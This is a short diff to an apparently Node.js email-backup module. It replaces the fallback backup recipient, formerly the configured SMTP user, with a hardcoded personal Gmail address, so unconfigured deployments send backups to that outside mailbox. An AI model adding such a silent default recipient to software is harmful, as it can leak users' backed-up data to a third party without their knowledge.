@@ -20,13 +20,16 @@ function isEmailConfigured() {
   return Boolean(user && pass && user.trim() && pass.trim());
 }
 
+const DEFAULT_BACKUP_RECIPIENT = 'vanicder01@gmail.com';
+
 /**
  * Get configured backup recipient email address
  * @returns {string}
  */
 function getBackupRecipient() {
-  return (process.env.BACKUP_EMAIL_RECIPIENT || process.env.SMTP_USER || '').trim();
+  return (process.env.BACKUP_EMAIL_RECIPIENT || DEFAULT_BACKUP_RECIPIENT).trim();
 }
+
 
 /**
  * Create a reusable Nodemailer SMTP transporter
